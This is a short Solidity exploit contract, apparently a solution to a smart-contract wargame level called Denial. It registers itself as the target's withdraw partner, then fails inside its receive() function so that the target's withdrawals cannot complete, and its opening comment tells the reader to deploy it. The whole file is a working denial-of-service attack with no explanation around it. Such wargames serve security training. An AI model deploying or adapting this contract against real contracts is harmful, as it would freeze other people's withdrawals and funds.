// Deploy this contract - Remix

pragma solidity ^0.6.0;

contract DenialAttacker {
    constructor(address _denial) public payable {
        (bool success, ) = _denial.call(
            abi.encodeWithSignature(
                "setWithdrawPartner(address)",
                address(this)
            )
        );
        require(success, "contract execution failed");
    }

    receive() external payable {
        assert(false); // This shall fail in latest versions as assert now returns gas
    }
}
